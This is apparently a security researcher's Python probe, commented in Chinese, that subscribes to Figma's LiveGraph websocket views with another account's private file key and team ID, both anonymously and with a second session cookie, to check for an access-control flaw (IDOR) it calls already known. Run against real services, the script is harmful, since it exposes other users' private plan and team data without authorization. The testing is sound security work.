"""Plan 系视图探测：PlanByFileKey / TeamByIdForPlanView / OrgByIdForPlanView
目标：以 A 文件 key / A teamId 为输入，验证 plan 数据是否绑定文件权限"""
import sys, json, asyncio
import websockets
sys.stdout.reconfigure(encoding="utf-8", errors="replace")

CK_B = open('ws_cookie_B.txt', encoding='utf-8').read().strip()
A_FILE = "5Gs4PaTz11Hlk2sqVnidBG"    # A 私有文件
PUB_FILE = "bv2nMIdFf4u3dESGail4sm"   # 公开对照
A_TEAM = "1666382706663462213"        # A 的 team（旧脚本 A_ORG 实为 team）
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36"

HASHES = {
    "PlanByFileKey": "f3100f1ff3ea3f670d76ee03e3d3b842a2ca479fef2ec5e95a",
    "TeamByIdForPlanView": "1702975bb11e8a131da34d8767ea0ef2174c622e6a87a94cd2",
    "OrgByIdForPlanView": "c99f01108f2893bdccf8912323ca9ac97a7c0c6b6232faa979",
}

def lg_url(client_url):
    return (f"wss://www.figma.com/api/livegraph?pv=1&pr=251c5be83e6853e5&pt=1786072093"
            f"&ph=sb9dUg8LQV0WGY29b-j8nggmhGX8TR2vghWs-rNzbds&userId=&anonUserId="
            f"&clientType=web&commitHash=5848603c50c1ee154ea6a1fe5ee3aab3791c5b48"
            f"&preload=%7B%7D&requestedProtocolVersion=2"
            f"&clientUrl=https%3A%2F%2Fwww.figma.com%2Ffile%2F{client_url}"
            f"&connectionType=initial&reconnect=0")

def auth(client_url):
    return {"messageType": "auth", "clientType": "web",
            "args": {"userId": None, "anonymousUserId": None},
            "tags": {"clientType": "web", "commitHash": "81855c2bc7c604648169c4e4333f43579bfa7464",
                     "clientUrl": f"https://www.figma.com/file/{client_url}"},
            "clientRequestedVersion": 2}

async def sub(label, view_name, args, cookie, client_url, wait=14):
    frames = []
    try:
        async with websockets.connect(lg_url(client_url),
                                      additional_headers={"User-Agent": UA, "Cookie": cookie,
                                                          "Origin": "https://www.figma.com"},
                                      max_size=50_000_000, open_timeout=15) as ws:
            await ws.send(json.dumps(auth(client_url)))
            for _ in range(3):
                msg = await asyncio.wait_for(ws.recv(), timeout=8)
                if isinstance(msg, str) and "authSuccess" in msg:
                    break
            await ws.send(json.dumps({"messageType": "subscribe", "viewName": view_name,
                                      "viewHash": HASHES[view_name],
                                      "loadType": "initial", "args": args}))
            deadline = asyncio.get_event_loop().time() + wait
            while asyncio.get_event_loop().time() < deadline:
                try:
                    msg = await asyncio.wait_for(ws.recv(), timeout=3)
                    if isinstance(msg, str) and ("denormalizedPendingMutations" in msg
                                                 or "errors" in msg):
                        frames.append(msg)
                except asyncio.TimeoutError:
                    break
    except Exception as e:
        print(f"[{label}] ❌ {type(e).__name__}: {str(e)[:90]}"); return
    total = sum(len(f) for f in frames)
    has_data = any('"initial": {' in f for f in frames)
    print(f"[{label}] 帧数={len(frames)} 总{total}B 含initial={has_data}")
    for f in frames:
        print(f"    🖼 {f[:600]}")

async def main():
    # 1. PlanByFileKey: A 私有文件（匿名）
    await sub("PlanByFileKey 匿名→A私有", "PlanByFileKey", {"fileKey": A_FILE}, "", A_FILE)
    # 2. PlanByFileKey: A 私有文件（B 会话）
    await sub("PlanByFileKey B→A私有", "PlanByFileKey", {"fileKey": A_FILE}, CK_B, A_FILE)
    # 3. PlanByFileKey: 公开文件（B 对照）
    await sub("PlanByFileKey B→公开", "PlanByFileKey", {"fileKey": PUB_FILE}, CK_B, PUB_FILE)
    # 4. TeamByIdForPlanView: A 的 team（匿名，复现已知 IDOR）
    await sub("TeamByIdForPlanView 匿名→A-team", "TeamByIdForPlanView",
              {"teamId": A_TEAM}, "", PUB_FILE)

asyncio.run(main())
